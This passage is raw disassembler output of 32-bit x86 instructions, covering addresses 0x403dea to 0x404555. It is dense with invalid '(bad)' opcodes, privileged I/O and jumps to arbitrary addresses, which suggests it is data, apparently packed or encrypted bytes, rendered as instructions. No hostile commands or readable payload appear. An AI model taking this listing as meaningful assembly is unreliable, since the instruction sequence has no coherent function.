  403dea:	cmp    DWORD PTR [esi-0x14],esp
  403ded:	test   eax,0x471874b6
  403df2:	(bad)  
  403df3:	sub    al,0x36
  403df5:	inc    ebx
  403df6:	xchg   ebx,eax
  403df7:	mov    al,0xa8
  403df9:	iret   
  403dfa:	lods   eax,DWORD PTR ds:[esi]
  403dfb:	pushf  
  403dfc:	iret   
  403dfd:	mov    edi,0xe57c7167
  403e02:	pop    eax
  403e03:	mov    WORD PTR [ebx+0x0],ds
  403e06:	add    BYTE PTR [ebx+0x23719256],al
  403e0c:	pop    ebp
  403e0d:	ret    0x299
  403e10:	and    ch,dl
  403e12:	xchg   edi,eax
  403e13:	loope  0x403db9
  403e15:	jb     0x403e8b
  403e17:	jg     0x403dfe
  403e19:	push   DWORD PTR [edi+edx*2]
  403e1c:	daa    
  403e1d:	add    al,0x2a
  403e1f:	add    BYTE PTR [eax],al
  403e21:	cld    
  403e22:	mov    ch,0xb5
  403e24:	fwait
  403e25:	xor    al,BYTE PTR [eax]
  403e27:	pop    es
  403e28:	add    BYTE PTR [eax],al
  403e2a:	out    0xfa,eax
  403e2c:	repz mov ebx,0x19984e66
  403e32:	and    eax,0x6700
  403e37:	je     0x403e26
  403e39:	fsin   
  403e3b:	mov    ecx,edx
  403e3d:	push   edx
  403e3e:	cwde   
  403e3f:	ss aam 0x96
  403e42:	rol    DWORD PTR [ebx+0x39],cl
  403e45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e46:	sahf   
  403e47:	adc    esi,DWORD PTR [edx+0x68537837]
  403e4d:	in     eax,0xfa
  403e4f:	xchg   ecx,eax
  403e50:	jae    0x403e8f
  403e52:	mov    esi,0x7a58568b
  403e57:	and    BYTE PTR [ebp+0x65b0000],0x60
  403e5e:	inc    esp
  403e5f:	ins    BYTE PTR es:[edi],dx
  403e60:	add    BYTE PTR [eax],al
  403e62:	push   edx
  403e63:	mov    edi,0xfeededd6
  403e68:	inc    BYTE PTR [ebp-0x39]
  403e6b:	es pop ecx
  403e6d:	jns    0x403e0a
  403e6f:	into   
  403e70:	fisubr WORD PTR [edi+0x4c88c7]
  403e76:	add    cl,ah
  403e78:	outs   dx,DWORD PTR ds:[esi]
  403e79:	out    dx,eax
  403e7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e7b:	push   ebx
  403e7c:	call   0x6c41:0x72432122
  403e83:	ins    BYTE PTR es:[edi],dx
  403e84:	js     0x403eaf
  403e86:	popa   
  403e87:	stos   DWORD PTR es:[edi],eax
  403e88:	jp     0x403eea
  403e8a:	push   edx
  403e8b:	adc    DWORD PTR [ecx-0x64af2366],edx
  403e91:	or     DWORD PTR [esp+edi*2+0xe34071],esp
  403e98:	add    ah,bl
  403e9a:	loop   0x403e27
  403e9c:	mov    eax,0x7b046552
  403ea1:	add    BYTE PTR [eax],al
  403ea3:	sub    esp,DWORD PTR [ebx-0x4b63e6cf]
  403ea9:	aad    0x88
  403eab:	add    BYTE PTR cs:[eax],al
  403eae:	into   
  403eaf:	out    0x6,al
  403eb1:	and    BYTE PTR [edi],dh
  403eb3:	pop    esi
  403eb4:	(bad)  
  403eb5:	jns    0x403f0e
  403eb7:	and    bh,bh
  403eb9:	jne    0x403f05
  403ebb:	cmp    al,0xd0
  403ebd:	repz dec edx
  403ebf:	adc    bh,BYTE PTR [ecx]
  403ec1:	xchg   edx,eax
  403ec2:	xor    eax,eax
  403ec4:	lds    eax,FWORD PTR [eax]
  403ec6:	add    BYTE PTR [ecx+0xa8e299],dl
  403ecc:	rol    BYTE PTR [eax],cl
  403ece:	add    BYTE PTR [ecx+edx*1-0x27],dh
  403ed2:	inc    BYTE PTR [esi+0x3cf92db1]
  403ed8:	jle    0x403e99
  403eda:	cmc    
  403edb:	xchg   ebx,eax
  403edc:	push   eax
  403edd:	mov    esp,0xd64b7ffc
  403ee2:	xchg   edx,eax
  403ee3:	in     eax,0x19
  403ee5:	pop    esi
  403ee6:	mov    ds:0xd500,eax
  403eeb:	cs aas 
  403eed:	aad    0x69
  403eef:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  403ef1:	jmp    0x403f68
  403ef3:	pop    bp
  403ef5:	into   
  403ef6:	add    DWORD PTR [eax-0x7b],0x2d090000
  403efd:	pusha  
  403efe:	xor    ebp,DWORD PTR [esi-0x515c856f]
  403f04:	and    dl,BYTE PTR [ebp+0xd3352ee]
  403f0a:	imul   ebp,DWORD PTR [ecx-0x48243017],0xe30c8d3d
  403f14:	add    BYTE PTR [eax],al
  403f16:	test   eax,0x2cf6e1d6
  403f1b:	(bad)  
  403f1c:	jmp    FWORD PTR [esi+0x22]
  403f1f:	mov    bh,0x38
  403f21:	or     eax,0xa37cc77d
  403f26:	push   eax
  403f27:	push   0xffffff8e
  403f29:	push   ecx
  403f2a:	or     ebp,esi
  403f2c:	or     al,0x47
  403f2e:	add    BYTE PTR [eax],al
  403f30:	cdq    
  403f31:	test   eax,0xe45f71c3
  403f36:	inc    ebx
  403f37:	aas    
  403f38:	shl    cl,0x0
  403f3b:	add    BYTE PTR [esi+0x3b],ah
  403f3e:	mov    WORD PTR [edx+0x0],ss
  403f41:	add    BYTE PTR [esi],dh
  403f43:	out    0xb6,eax
  403f45:	pop    esp
  403f46:	inc    esi
  403f47:	sub    BYTE PTR [esi+0x0],0x0
  403f4b:	cli    
  403f4c:	jne    0x403f0c
  403f4e:	cmp    edi,DWORD PTR [eax-0x4f19384e]
  403f54:	daa    
  403f55:	pop    ecx
  403f56:	daa    
  403f57:	cld    
  403f58:	xor    al,0x65
  403f5a:	mov    al,ds:0xcc44eb
  403f5f:	add    BYTE PTR [edi],bl
  403f61:	fidiv  DWORD PTR [ebx-0x77]
  403f64:	push   ds
  403f65:	cmp    eax,0xf059a89
  403f6a:	jbe    0x403fa2
  403f6c:	mov    ds,WORD PTR [edx]
  403f6e:	xchg   ah,bl
  403f70:	out    dx,eax
  403f71:	fdivp  st(6),st
  403f73:	js     0x403f1d
  403f75:	push   esp
  403f76:	repz cld 
  403f78:	cli    
  403f79:	and    al,0xf5
  403f7b:	pop    ss
  403f7c:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  403f7e:	dec    esp
  403f7f:	or     eax,DWORD PTR [eax]
  403f81:	add    bh,bh
  403f83:	push   0xffffffa7
  403f85:	mov    esi,0xde74ad27
  403f8a:	add    eax,0xba273e4e
  403f8f:	or     BYTE PTR [ecx+0x0],dh
  403f92:	add    BYTE PTR [eax],bh
  403f94:	outs   dx,DWORD PTR ds:[esi]
  403f95:	xchg   sp,ax
  403f97:	jns    0x403fda
  403f99:	cdq    
  403f9a:	jmp    0x403f21
  403f9c:	push   es
  403f9d:	and    DWORD PTR [esp+ebp*8],esp
  403fa0:	jl     0x403f4e
  403fa2:	mov    edx,0xc8a7dd4d
  403fa7:	out    0x0,eax
  403fa9:	add    BYTE PTR [edi+0x78c16f7a],ah
  403faf:	pop    ss
  403fb0:	lea    eax,[edi+esi*4]
  403fb3:	add    BYTE PTR [eax],al
  403fb5:	es es jg 0x404016
  403fb9:	push   ecx
  403fba:	push   ebp
  403fbb:	jge    0x403f9d
  403fbd:	mov    ah,0x78
  403fbf:	xchg   BYTE PTR [ecx],bh
  403fc1:	sub    edi,ecx
  403fc3:	repz xor edi,DWORD PTR [eax]
  403fc6:	sbb    al,0xb9
  403fc8:	mov    DWORD PTR [esi+0x2d],ecx
  403fcb:	xor    eax,0x5e84b972
  403fd0:	add    BYTE PTR [eax],al
  403fd2:	jge    0x404030
  403fd4:	add    al,BYTE PTR [eax+eiz*1]
  403fd7:	add    BYTE PTR [eax],al
  403fd9:	mov    es,ebp
  403fdb:	mov    ebx,0xcd320f9e
  403fe0:	ins    BYTE PTR es:[edi],dx
  403fe1:	mov    dh,0x6a
  403fe3:	mov    eax,ds:0x66f94ebe
  403fe8:	sbb    dh,ch
  403fea:	push   eax
  403feb:	and    ch,BYTE PTR [edi]
  403fed:	mov    dl,0x28
  403fef:	mov    dl,0x53
  403ff1:	repnz or ch,BYTE PTR [ebx-0x2da8ec58]
  403ff8:	xchg   ebp,eax
  403ff9:	mov    bl,ch
  403ffb:	lods   al,BYTE PTR ds:[esi]
  403ffc:	retf   
  403ffd:	mov    cl,0x71
  403fff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404000:	xchg   ecx,eax
  404001:	out    0x2b,al
  404003:	sbb    DWORD PTR [ebx],eax
  404005:	mov    cl,0xb4
  404007:	in     eax,0x1a
  404009:	rcr    BYTE PTR [edi],0x0
  40400c:	add    dh,dl
  40400e:	sub    al,0x50
  404010:	aaa    
  404011:	mov    edx,0x622d1834
  404016:	outs   dx,BYTE PTR ds:[esi]
  404017:	push   edx
  404018:	loope  0x40402f
  40401a:	imul   ebp,DWORD PTR ds:[ecx-0x3f97cb53],0x710000ad
  404025:	mov    WORD PTR [edx+0x0],ds
  404028:	add    BYTE PTR [edx],dl
  40402a:	xchg   DWORD PTR [esi+ebx*2],esp
  40402d:	mov    esp,0xb18028b3
  404032:	add    BYTE PTR [eax],al
  404034:	je     0x403fce
  404036:	or     al,0x18
  404038:	add    BYTE PTR [eax],al
  40403a:	mov    edi,0x3e210d1a
  40403f:	das    
  404040:	test   BYTE PTR [esi+0x20],0x12
  404044:	fdiv   QWORD PTR [ebx]
  404046:	pusha  
  404047:	fcomi  st,st(6)
  404049:	xchg   cl,cl
  40404b:	mov    dl,0x7a
  40404d:	cld    
  40404e:	mov    ch,BYTE PTR [edi]
  404050:	jo     0x403fee
  404052:	in     al,0xfe
  404054:	adc    DWORD PTR [eax+0x7680dd34],esp
  40405a:	add    BYTE PTR [eax],al
  40405c:	sub    eax,0x7b53a630
  404061:	jmp    0x4040dd
  404063:	repnz xchg edi,eax
  404065:	jbe    0x40406d
  404067:	mov    dl,0x67
  404069:	push   edx
  40406a:	into   
  40406b:	retf   
  40406c:	cmp    eax,0x8cf2e5da
  404071:	add    BYTE PTR es:[eax],al
  404074:	pop    bp
  404076:	cs retf 
  404078:	sar    BYTE PTR [eax],1
  40407a:	mov    ch,0x45
  40407c:	in     al,0xe3
  40407e:	xor    esi,edi
  404080:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404081:	shl    BYTE PTR [eax],1
  404083:	imul   dl
  404085:	pop    eax
  404086:	push   es
  404087:	jl     0x40401b
  404089:	xchg   esi,eax
  40408a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40408b:	adc    DWORD PTR [eax-0x6c],ebp
  40408e:	mov    ch,0x96
  404090:	cli    
  404091:	icebp  
  404092:	push   eax
  404093:	loopne 0x404052
  404095:	ins    BYTE PTR es:[edi],dx
  404096:	inc    BYTE PTR [ebx]
  404098:	mov    edi,0x3d6e7da3
  40409d:	outs   dx,DWORD PTR ds:[esi]
  40409e:	jae    0x40406e
  4040a0:	cmp    ecx,DWORD PTR ds:0x18d4a032
  4040a6:	xor    al,BYTE PTR [edx+0x6e]
  4040a9:	jb     0x4040a2
  4040ab:	int    0x3c
  4040ad:	test   BYTE PTR [ebx+0x0],dh
  4040b0:	add    BYTE PTR [edx-0x64],bl
  4040b3:	xor    al,0x4
  4040b5:	sbb    eax,DWORD PTR [eax]
  4040b7:	add    BYTE PTR [ebx],dh
  4040b9:	or     ebp,DWORD PTR [esi+0x2c]
  4040bc:	clc    
  4040bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040be:	mov    ebx,0x752d23fe
  4040c3:	and    al,0x32
  4040c5:	int    0x28
  4040c7:	loop   0x4040a4
  4040c9:	or     ebx,0x44
  4040cc:	add    eax,DWORD PTR [eax]
  4040ce:	add    BYTE PTR [esi-0x1f6610cd],al
  4040d4:	out    dx,al
  4040d5:	dec    ecx
  4040d6:	test   al,0xff
  4040d8:	popa   
  4040d9:	jg     0x404111
  4040db:	sub    eax,0xd17403fe
  4040e0:	out    0xaa,al
  4040e2:	mov    ds:0x9ce3a094,eax
  4040e7:	lock (bad) 
  4040e9:	mov    dl,0x47
  4040eb:	(bad)  
  4040ec:	sti    
  4040ed:	call   0xaff1cb6b
  4040f2:	mov    dl,0x38
  4040f4:	mov    dl,0x64
  4040f6:	lods   eax,DWORD PTR ds:[esi]
  4040f7:	js     0x4040c0
  4040f9:	pushf  
  4040fa:	mov    ebp,0x79c3370e
  4040ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404100:	push   esp
  404101:	xchg   edx,eax
  404102:	adc    edi,ebp
  404104:	inc    ecx
  404105:	mov    esi,0x7bf12db0
  40410a:	inc    eax
  40410b:	pop    eax
  40410c:	add    BYTE PTR [eax],al
  40410e:	xchg   ebx,eax
  40410f:	adc    al,0x70
  404111:	pop    esp
  404112:	adc    al,0x4d
  404114:	mov    al,ds:0x6bb377ac
  404119:	fwait
  40411a:	cs jbe 0x40414c
  40411d:	(bad)  
  40411e:	push   esi
  40411f:	inc    ecx
  404120:	pop    ss
  404121:	mov    cl,BYTE PTR [ebp+0x4eda375f]
  404127:	cli    
  404128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404129:	lahf   
  40412a:	cdq    
  40412b:	sbb    al,0x95
  40412d:	enter  0xdd,0x0
  404131:	sbb    BYTE PTR [eax+0x1a],cl
  404134:	add    BYTE PTR [eax],al
  404136:	imul   esi,DWORD PTR [edx-0x7a],0xa3c6a4e8
  40413d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40413e:	cmp    cl,BYTE PTR [ecx]
  404140:	call   0xc045d5b1
  404145:	mov    esp,0xe3b90000
  40414a:	fimul  DWORD PTR [esi]
  40414c:	inc    edi
  40414d:	mov    edx,0xf2c8
  404152:	push   cs
  404153:	es dec esi
  404155:	push   esp
  404156:	xor    DWORD PTR [ebx],esp
  404158:	lods   eax,DWORD PTR ds:[esi]
  404159:	jnp    0x40413f
  40415b:	cmp    BYTE PTR [edx],bh
  40415d:	mov    ds:0xfee8fee4,eax
  404162:	out    0xc3,al
  404164:	(bad)  
  404165:	cmp    BYTE PTR ss:[ebx+edi*8+0x0],cl
  40416a:	add    BYTE PTR [eax+esi*1],dl
  40416d:	out    dx,eax
  40416e:	push   0xcd3cbba3
  404173:	scas   al,BYTE PTR es:[edi]
  404174:	aas    
  404175:	fs push eax
  404177:	data16 fwait
  404179:	jnp    0x4041df
  40417b:	test   BYTE PTR [edi+0x0],al
  40417e:	add    dh,al
  404180:	cmp    al,0xc3
  404182:	pop    ebx
  404183:	test   edi,ebp
  404185:	dec    edx
  404186:	fisubr WORD PTR [edx]
  404188:	mov    ebx,0x2ca6cb5c
  40418d:	nop
  40418e:	data16 ja 0x4041c9
  404191:	icebp  
  404192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404193:	and    BYTE PTR [eax-0x552786b0],bh
  404199:	and    BYTE PTR [eax-0x3171ace6],0x30
  4041a0:	xor    eax,DWORD PTR [ebx]
  4041a2:	iret   
  4041a3:	icebp  
  4041a4:	push   edi
  4041a5:	retf   
  4041a6:	mov    ds:0x315e1ed9,eax
  4041ab:	mov    BYTE PTR [esi],cl
  4041ad:	add    BYTE PTR [eax],al
  4041af:	xor    bl,BYTE PTR [edx]
  4041b1:	jmp    DWORD PTR [ebp+0x2e]
  4041b4:	dec    ebx
  4041b5:	stc    
  4041b6:	bound  edx,QWORD PTR [ebx+esi*2+0x681d5dc2]
  4041bd:	xchg   ebx,eax
  4041be:	pop    eax
  4041bf:	fistp  QWORD PTR [esp+edi*8]
  4041c2:	mov    eax,ds:0x82437fd0
  4041c7:	inc    edi
  4041c8:	stos   DWORD PTR es:[edi],eax
  4041c9:	xor    BYTE PTR [edx+edi*1],ch
  4041cc:	inc    edx
  4041cd:	adc    BYTE PTR ds:0x760e5fec,cl
  4041d3:	push   cs
  4041d4:	ja     0x404214
  4041d6:	iret   
  4041d7:	xor    DWORD PTR [edi],ecx
  4041d9:	es icebp 
  4041db:	into   
  4041dc:	lahf   
  4041dd:	xchg   esp,eax
  4041de:	shl    DWORD PTR [ecx-0x28],0xf
  4041e2:	xor    ebp,edi
  4041e4:	(bad)  
  4041e6:	shr    BYTE PTR [esi+0x6a56fc36],1
  4041ec:	inc    ebp
  4041ed:	sub    edi,DWORD PTR [esp+edi*2]
  4041f0:	mov    ch,BYTE PTR [esi+edx*1+0xa04c]
  4041f7:	aam    0x29
  4041f9:	outs   dx,BYTE PTR ds:[esi]
  4041fa:	test   DWORD PTR [ecx],ebp
  4041fc:	stos   BYTE PTR es:[edi],al
  4041fd:	cs mov al,0xf6
  404200:	mov    edi,0x3f1869df
  404205:	push   ecx
  404206:	push   esp
  404207:	out    dx,al
  404208:	and    BYTE PTR [edx],bl
  40420a:	add    eax,0x3b267e86
  40420f:	xchg   esp,eax
  404210:	test   al,0x1e
  404212:	sbb    al,0x5a
  404214:	cli    
  404215:	pop    ebx
  404216:	push   ecx
  404217:	or     cl,BYTE PTR [esi]
  404219:	sbb    dh,cl
  40421b:	push   esi
  40421c:	mov    ds:0xe5340f8e,al
  404221:	pop    ecx
  404222:	fwait
  404223:	dec    edi
  404224:	mov    ecx,0x21fa7753
  404229:	loop   0x404212
  40422b:	mov    cs,ebx
  40422d:	mov    gs,WORD PTR [ebx+0x7bf90bb0]
  404233:	inc    ch
  404235:	xchg   edi,eax
  404236:	idiv   DWORD PTR [edi-0x78449d98]
  40423c:	or     ecx,DWORD PTR [edi-0x4d]
  40423f:	pusha  
  404240:	xor    al,0xa1
  404242:	fwait
  404243:	fwait
  404244:	or     edi,DWORD PTR [edx+ebp*2]
  404247:	aad    0x10
  404249:	mov    WORD PTR ds:0x46460000,ds
  40424f:	adc    BYTE PTR [ebp+0x26],al
  404252:	cmp    BYTE PTR [edx+0x68a0f7a7],al
  404258:	inc    eax
  404259:	hlt    
  40425a:	add    BYTE PTR [eax],al
  40425c:	xchg   ebx,eax
  40425d:	inc    edi
  40425e:	or     ebx,DWORD PTR [esi+ecx*1-0x3e]
  404262:	mov    esp,0xcafcad8e
  404267:	dec    edi
  404268:	mov    ds:0x3508d1,eax
  40426d:	add    BYTE PTR [esi+0x1f95e52d],bh
  404273:	xor    al,0x6a
  404275:	sahf   
  404276:	jmp    0x4034a2ca
  40427b:	mov    ds:0x2de8b5df,al
  404280:	xchg   BYTE PTR [ebx-0x34915a42],bh
  404286:	jno    0x4042a7
  404288:	push   edi
  404289:	std    
  40428a:	or     DWORD PTR [eax+0x66e80735],ebx
  404290:	sub    al,ah
  404292:	jecxz  0x404254
  404294:	xor    BYTE PTR [eax],al
  404296:	add    dh,dh
  404298:	inc    ebx
  404299:	inc    esi
  40429a:	inc    esi
  40429b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40429c:	adc    eax,0xfcd0f452
  4042a1:	cli    
  4042a2:	inc    ebp
  4042a3:	mov    gs,eax
  4042a5:	sbb    ch,BYTE PTR [edi]
  4042a7:	or     eax,0xe1b6543d
  4042ac:	in     eax,0x3d
  4042ae:	or     BYTE PTR [esi-0x2ac0000],bh
  4042b4:	or     eax,0x65bb7c79
  4042b9:	push   edi
  4042ba:	adc    eax,0xab0bfc7
  4042bf:	or     esi,esi
  4042c1:	jo     0x404292
  4042c3:	and    DWORD PTR [esi],0x6a
  4042c6:	lds    esi,FWORD PTR [ecx]
  4042c8:	scas   eax,DWORD PTR es:[edi]
  4042c9:	mov    edx,0xc5170af5
  4042ce:	jo     0x4042f9
  4042d0:	adc    ah,BYTE PTR [edx]
  4042d2:	aam    0x5f
  4042d4:	cmp    al,0x2e
  4042d6:	stos   DWORD PTR es:[edi],eax
  4042d7:	adc    BYTE PTR [edi],cl
  4042d9:	cli    
  4042da:	scas   al,BYTE PTR es:[edi]
  4042db:	stos   BYTE PTR es:[edi],al
  4042dc:	add    BYTE PTR [edx-0x31],0xa8
  4042e0:	pusha  
  4042e1:	push   0x6ae9bb24
  4042e6:	push   edx
  4042e7:	or     eax,0x7efe1532
  4042ec:	pop    eax
  4042ed:	shr    BYTE PTR [ebp+0x4a660000],0x37
  4042f4:	and    BYTE PTR [esi],dh
  4042f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042f7:	add    ebx,DWORD PTR [edi]
  4042f9:	sub    ebx,ecx
  4042fb:	in     eax,0x25
  4042fd:	jmp    0xed64:0xf52ea1b9
  404304:	neg    esi
  404306:	push   ecx
  404307:	fdiv   QWORD PTR [edi]
  404309:	js     0x40429c
  40430b:	cmp    ch,ah
  40430d:	and    eax,0x20610b7e
  404312:	sbb    BYTE PTR [ebp+0x4548],0xbf
  404319:	out    dx,al
  40431a:	shr    DWORD PTR [ebx-0xf],0x6b
  40431e:	mov    dl,0xba
  404320:	pop    ebp
  404321:	xchg   ecx,eax
  404322:	(bad)  
  404323:	out    dx,eax
  404324:	pop    dx
  404326:	es out dx,al
  404328:	pop    edx
  404329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40432a:	repnz imul eax,DWORD PTR cs:[ecx],0x10
  40432f:	sbb    DWORD PTR [esi-0x4726df91],eax
  404335:	mov    esp,0x52c0b90e
  40433a:	add    BYTE PTR [eax],al
  40433c:	pop    edx
  40433d:	cmp    dh,BYTE PTR [eax-0x25]
  404340:	adc    al,0xe5
  404342:	leave  
  404343:	icebp  
  404344:	jmp    0x404358
  404346:	jbe    0x40438a
  404348:	jo     0x4043aa
  40434a:	and    al,0x9d
  40434c:	cmp    BYTE PTR [eax+0x4d],dl
  40434f:	adc    DWORD PTR [ecx],edx
  404351:	fs stos BYTE PTR es:[edi],al
  404353:	scas   eax,DWORD PTR es:[edi]
  404354:	dec    ebp
  404355:	int3   
  404356:	mov    dl,0x0
  404358:	add    BYTE PTR [edx],ah
  40435a:	or     BYTE PTR [ebx+0x11100000],dl
  404360:	inc    ebx
  404361:	jo     0x4042fe
  404363:	dec    esi
  404364:	or     bl,dh
  404366:	jo     0x4043c7
  404368:	or     BYTE PTR [esi+0x0],bh
  40436b:	add    BYTE PTR [esi+0xd],ah
  40436e:	xor    dh,dh
  404370:	clc    
  404371:	hlt    
  404372:	sbb    bl,BYTE PTR [ebx]
  404374:	int    0x75
  404376:	dec    eax
  404377:	nop
  404378:	add    BYTE PTR [eax],al
  40437a:	cdq    
  40437b:	test   DWORD PTR [ebx-0x76118fa5],edi
  404381:	xor    edi,esi
  404383:	push   edi
  404384:	daa    
  404385:	mov    ecx,ebx
  404387:	add    bl,BYTE PTR [esi+0x2b7addd1]
  40438d:	pop    esi
  40438e:	push   esp
  40438f:	ret    0x628e
  404392:	aas    
  404393:	cmc    
  404394:	inc    eax
  404395:	xchg   esp,eax
  404396:	add    BYTE PTR [eax],al
  404398:	inc    esp
  404399:	sti    
  40439a:	add    BYTE PTR [eax],al
  40439c:	sub    al,0x2e
  40439e:	mov    eax,0x517cf622
  4043a3:	std    
  4043a4:	jle    0x40438e
  4043a6:	pop    esp
  4043a7:	cmp    eax,0x43a4d463
  4043ac:	adc    cl,0x0
  4043af:	add    BYTE PTR [esi-0x64],dh
  4043b2:	pusha  
  4043b3:	neg    DWORD PTR [esi+0x28bb73f5]
  4043b9:	mov    BYTE PTR [edi+0x7d780000],cl
  4043bf:	fwait
  4043c0:	cmp    al,0x3
  4043c2:	push   es
  4043c3:	dec    ebp
  4043c4:	cmp    DWORD PTR [edi+0x6d88],eax
  4043ca:	push   esp
  4043cb:	push   esp
  4043cc:	lea    edi,[ecx]
  4043ce:	xor    DWORD PTR [ecx+0x4684b3],esp
  4043d4:	add    BYTE PTR [edx],al
  4043d6:	std    
  4043d7:	sahf   
  4043d8:	xchg   ebx,eax
  4043d9:	in     al,0x37
  4043db:	jae    0x4043c4
  4043dd:	push   ecx
  4043de:	and    ebx,eax
  4043e0:	(bad)  
  4043e2:	repnz mov dl,0x35
  4043e5:	push   es
  4043e6:	loop   0x4043d5
  4043e8:	jecxz  0x40436a
  4043ea:	lods   eax,DWORD PTR ds:[esi]
  4043eb:	add    BYTE PTR [eax],al
  4043ed:	mov    ebp,0xfc202576
  4043f2:	inc    esp
  4043f3:	xchg   DWORD PTR [eax],eax
  4043f5:	add    BYTE PTR [esi+edi*1-0x4d],dh
  4043f9:	inc    edi
  4043fa:	pop    eax
  4043fb:	fdivr  QWORD PTR ds:0x5137ebf5
  404401:	mov    esi,0x33993e6f
  404406:	pop    es
  404407:	(bad)  
  404408:	adc    al,0x50
  40440a:	or     BYTE PTR [eax+0xdf50000],ch
  404410:	sbb    cl,BYTE PTR [ecx-0x75]
  404413:	jno    0x404462
  404415:	pop    ebx
  404416:	pop    ds
  404417:	mov    eax,0x2083766d
  40441c:	into   
  40441d:	fnsave [esi]
  40441f:	push   ecx
  404420:	push   cs
  404421:	fs mov esi,0xfa247b
  404427:	add    al,BYTE PTR [eax]
  404429:	add    BYTE PTR [esi+eax*2-0x14],ah
  40442d:	scas   eax,DWORD PTR es:[edi]
  40442e:	outs   dx,BYTE PTR ds:[esi]
  40442f:	dec    ebx
  404430:	bound  esp,QWORD PTR ss:[ebx]
  404433:	nop
  404434:	int3   
  404435:	sldt   WORD PTR [eax]
  404438:	rol    BYTE PTR [eax+0x0],cl
  40443b:	add    BYTE PTR [eax],al
  40443d:	test   al,0x34
  40443f:	xchg   BYTE PTR [edi+0x40],ah
  404442:	xor    eax,0x428c0000
  404447:	add    BYTE PTR [eax],al
  404449:	out    0x1e,eax
  40444b:	stos   BYTE PTR es:[edi],al
  40444c:	mov    ecx,0x60248b7d
  404451:	lds    ecx,FWORD PTR [eax+ecx*8+0x0]
  404455:	add    BYTE PTR [esi+0x12],cl
  404458:	jns    0x40448b
  40445a:	sub    eax,0x70a7672b
  40445f:	inc    esi
  404460:	shl    ah,cl
  404462:	push   ebp
  404463:	into   
  404464:	cli    
  404465:	out    0xa3,eax
  404467:	nop
  404468:	inc    eax
  404469:	into   
  40446a:	add    BYTE PTR [eax],al
  40446c:	lods   al,BYTE PTR ds:[esi]
  40446d:	jno    0x4044e2
  40446f:	push   ebx
  404470:	ja     0x40442c
  404472:	jge    0x404407
  404474:	loop   0x4044a4
  404476:	jg     0x4044c9
  404478:	js     0x4044ef
  40447a:	mov    ah,0x14
  40447c:	(bad)  
  40447d:	xchg   ecx,eax
  40447e:	jl     0x4044e3
  404480:	sti    
  404481:	mov    DWORD PTR [ecx],esp
  404483:	pop    edx
  404484:	and    eax,DWORD PTR [ebx+edi*8]
  404487:	add    BYTE PTR [eax],al
  404489:	stos   BYTE PTR es:[edi],al
  40448a:	in     eax,0xfe
  40448c:	mov    ds:0x3c26d578,eax
  404491:	push   es
  404492:	ror    eax,0x3a
  404495:	add    BYTE PTR [eax],al
  404497:	int    0xea
  404499:	adc    esi,eax
  40449b:	xchg   DWORD PTR [ebp-0x5e],ebp
  40449e:	inc    edx
  40449f:	jae    0x4044e3
  4044a1:	adc    BYTE PTR [esi+0x625119a3],ch
  4044a7:	(bad)  
  4044a8:	icebp  
  4044a9:	int    0x56
  4044ab:	and    BYTE PTR [edx],al
  4044ad:	ins    BYTE PTR es:[edi],dx
  4044ae:	das    
  4044af:	cmp    BYTE PTR [edx-0x4f6b9281],bh
  4044b5:	mov    cl,0x8e
  4044b7:	pop    ecx
  4044b8:	xlat   BYTE PTR ds:[ebx]
  4044b9:	das    
  4044ba:	cld    
  4044bb:	push   esi
  4044bc:	pop    ebx
  4044bd:	jmp    0x40446e
  4044bf:	inc    ebp
  4044c0:	inc    eax
  4044c1:	adc    BYTE PTR [eax],al
  4044c3:	add    al,ch
  4044c5:	mov    eax,0xf47d78c6
  4044ca:	aas    
  4044cb:	fs (bad) 
  4044cd:	xor    ebp,eax
  4044cf:	jnp    0x4044eb
  4044d1:	inc    ebp
  4044d2:	sub    ah,BYTE PTR [ecx+0x26]
  4044d5:	push   edi
  4044d6:	sub    al,0x36
  4044d8:	pavgw  mm7,mm6
  4044db:	and    al,ah
  4044dd:	jne    0x404461
  4044df:	sub    ebp,esp
  4044e1:	call   0xce92bf27
  4044e6:	out    0x41,al
  4044e8:	or     ebx,DWORD PTR [eax]
  4044ea:	jle    0x4044ea
  4044ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044ee:	add    BYTE PTR [ecx-0x7cc191cd],0x9
  4044f5:	cli    
  4044f6:	int3   
  4044f7:	dec    esi
  4044f8:	add    BYTE PTR [eax],al
  4044fa:	cld    
  4044fb:	push   0x1a203e5f
  404500:	cmp    BYTE PTR [ecx+esi*8-0x6c615b9e],bl
  404507:	pop    ss
  404508:	fbld   TBYTE PTR [eax-0x7dc6054d]
  40450e:	std    
  40450f:	push   0x6e
  404511:	js     0x40458f
  404513:	icebp  
  404514:	and    eax,0xa050fe05
  404519:	mov    al,ds:0x2d99beb1
  40451e:	std    
  40451f:	mov    dl,0x47
  404521:	push   edi
  404522:	inc    edi
  404523:	jl     0x40451d
  404525:	push   ds
  404526:	add    BYTE PTR [ebx+0x1c310000],0x6f
  40452d:	es inc ebp
  40452f:	xor    eax,0xcc1cdd4e
  404534:	push   ds
  404535:	add    BYTE PTR [eax],al
  404537:	scas   al,BYTE PTR es:[edi]
  404538:	sti    
  404539:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40453a:	sub    al,cl
  40453c:	dec    ebx
  40453d:	add    BYTE PTR [eax],al
  40453f:	jg     0x40452a
  404541:	push   edx
  404542:	mov    BYTE PTR [eax],0xe2
  404545:	add    BYTE PTR [eax],al
  404547:	fstp   TBYTE PTR [edi-0x372dfc90]
  40454d:	loop   0x40454f
  40454f:	add    BYTE PTR [ebp+0x423e6694],ah
  404555:	imul   eax,DWORD PTR [ecx],0x3b48d5
